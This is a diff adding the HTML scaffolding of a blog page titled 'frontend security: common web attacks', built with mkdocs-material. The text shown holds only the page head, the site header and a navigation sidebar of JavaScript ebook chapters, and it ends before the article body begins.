@@ -1,0 +1,4008 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Michael An">
+      
+      
+        <link rel="canonical" href="https://michael18811380328.github.io/ebook-kaikeba-frontend/19-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%B8%B8%E8%A7%81Web%E6%94%BB%E5%87%BB/">
+      
+      
+        <link rel="prev" href="../18-webpack-06/">
+      
+      
+        <link rel="next" href="../20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>19-前端安全-常见Web攻击 - Michale An Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Michale An Blog" class="md-header__button md-logo" aria-label="Michale An Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Michale An Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              19-前端安全-常见Web攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Michael18811380328/Michael18811380328.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Michael18811380328/Michael18811380328.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Michale An Blog" class="md-nav__button md-logo" aria-label="Michale An Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Michale An Blog
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Michael18811380328/Michael18811380328.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Michael18811380328/Michael18811380328.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    book-JS-The-good-parts
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            book-JS-The-good-parts
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../book-JS-The-good-parts/JS-the-good-parts.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JS-the-good-parts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../book-JS-The-good-parts/curry-function.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    curry-function
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-JS-basic
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-JS-basic
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/01-%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01-入门
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02-数据类型
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03-运算符
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    04-语法专题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    05-标准库
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    06-面向对象编程
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    07-异步操作
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/08-DOM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    08-DOM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/09-Event/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    09-Event
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/10-1-BOM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-1-BOM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/10-2-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-2-同源策略
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-3-表单
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/10-4-IndexedDB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-4-IndexedDB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/10-5-web-worker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-5-web-worker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    11-网页元素接口
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-JSES6-RYF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-JSES6-RYF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01-介绍
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/02-%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02-变量赋值
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/03-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03-解构赋值
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    04-字符串的扩展
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    05-字符串方法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/06-%E6%AD%A3%E5%88%99/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    06-正则
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/07-%E6%95%B0%E5%80%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    07-数值
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    08-函数
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    09-数组
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/10-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E5%B1%9E%E6%80%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-对象的新增属性
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    11-对象的新增方法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/12-Symbol/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    12-Symbol
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/13-Set%20%E5%92%8C%20Map%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    13-Set 和 Map 数据结构
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/14-Proxy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14-Proxy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/15-Reflect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    15-Reflect
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/16-Promise/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    16-Promise
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    17-遍历器的循环
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/18-Generator/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    18-Generator
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    19-Generator异步应用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    20-async 函数
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/21-Class%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    21-Class 的基本语法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/22-Class%20%E7%9A%84%E7%BB%A7%E6%89%BF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    22-Class 的继承
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/23-Module%20%E7%9A%84%E8%AF%AD%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    23-Module 的语法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    24-Module 的加载实现
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/25-%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    25-编程风格
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-JSES6-RYF/readme/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    readme
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-Principles of Computer Composition
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-Principles of Computer Composition
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-Principles of Computer Composition/计算机组成原理知识点总结.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机组成原理知识点总结
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-heima-nodejs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-heima-nodejs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-heima-nodejs/00/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    00
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-heima-nodejs/01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-heima-nodejs/02/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-heima-nodejs/03/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-javascript-secret-garden
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-javascript-secret-garden
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-javascript-secret-garden/JavaScript 秘密花园-zh.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JavaScript 秘密花园-zh
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-kaikeba-frontend
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
